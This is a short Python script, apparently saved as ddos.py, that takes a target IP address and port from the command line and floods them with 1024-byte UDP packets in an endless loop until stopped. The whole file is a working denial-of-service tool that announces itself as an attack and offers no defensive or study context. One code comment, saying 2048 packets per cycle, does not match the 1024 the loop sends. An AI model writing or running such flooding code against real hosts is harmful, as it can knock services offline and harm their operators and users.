import socket
import sys

def send_packets(target_ip, target_port):
    packet_size = 1024  # Preferred packet size in bytes
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b'X' * packet_size  # Packet of specified size

    print(f"Starting attack on {target_ip}:{target_port}...")
    print("Press Ctrl+C to stop.")

    try:
        while True:
            for _ in range(1024):  # Send 2048 packets per loop cycle
                sock.sendto(data, (target_ip, target_port))
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()
        print("Attack finished.")

if __name__ == "__main__":
    # Check if command-line arguments are provided
    if len(sys.argv) != 3:
        print("Usage: python ddos.py <target_ip> <target_port>")
        sys.exit(1)

    # Parse command-line arguments
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    # Start packet sending
    send_packets(target_ip, target_port)